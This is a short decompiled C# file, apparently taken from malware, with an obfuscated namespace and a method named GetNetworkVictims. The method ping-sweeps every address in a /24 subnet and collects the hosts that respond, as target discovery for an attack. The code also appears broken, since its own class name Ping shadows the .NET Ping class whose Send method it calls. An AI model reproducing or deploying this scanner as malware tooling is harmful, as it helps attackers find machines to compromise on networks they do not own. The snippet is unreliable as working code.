using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;

namespace MufMaOSvGyvz
{
	// Token: 0x02000017 RID: 23
	public class Ping
	{
		// Token: 0x06000067 RID: 103
		public static List<string> GetNetworkVictims(string string_0)
		{
			List<string> list = new List<string>();
			for (int i = 1; i < 255; i++)
			{
				string str = "." + i.ToString();
				Ping ping = new Ping();
				PingReply pingReply = ping.Send(string_0 + str, 900);
				if (pingReply.Status == IPStatus.Success)
				{
					try
					{
						IPAddress address = IPAddress.Parse(string_0 + str);
						Dns.GetHostEntry(address);
						list.Add(string_0 + str);
					}
					catch
					{
					}
				}
			}
			return list;
		}
	}
}
